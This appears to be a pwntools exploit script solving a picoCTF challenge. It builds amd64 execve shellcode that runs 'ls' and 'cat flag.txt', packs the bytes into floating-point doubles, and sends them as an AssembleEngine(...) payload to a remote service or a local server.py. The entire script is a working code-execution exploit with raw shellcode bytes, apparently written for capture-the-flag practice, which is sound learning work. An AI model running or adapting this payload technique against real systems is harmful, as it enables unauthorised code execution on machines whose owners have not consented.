from pwn import *
import struct

context.arch = 'amd64'

if args.REMOTE:
    ls = asm(shellcraft.execve(b"/bin/ls", ["ls"]))
    cat = asm(shellcraft.execve(b"/bin/cat", ["cat", "flag.txt"]))
    r = remote('mercury.picoctf.net', 48700)
else:
    ls = b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    cat = b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    r = process(['python', 'server.py'])
log.info(f'ls shellcode: {ls}')
log.info(f'cat flag.txt shellcode: {cat}')

def Transfer2DoubleArray(shellcode):
    shell_array = []
    if len(shellcode) % 8 > 0:
        shellcode += (8 - len(shellcode) % 8) * b'\x00'
    for i in range(0, len(shellcode), 8):
        double_tmp = struct.unpack('d', shellcode[i:i+8])[0]
        shell_array.append(double_tmp)
    
    return shell_array



payload = f'AssembleEngine({Transfer2DoubleArray(ls)})'
r.recvuntil(b'Provide size. Must be < 5k:')
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())
r.close()

if args.REMOTE:
    r = remote('mercury.picoctf.net', 48700)
else:
    r = process(['python', 'server.py'])
payload = f'AssembleEngine({Transfer2DoubleArray(cat)})'
r.recvuntil(b'Provide size. Must be < 5k:')
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())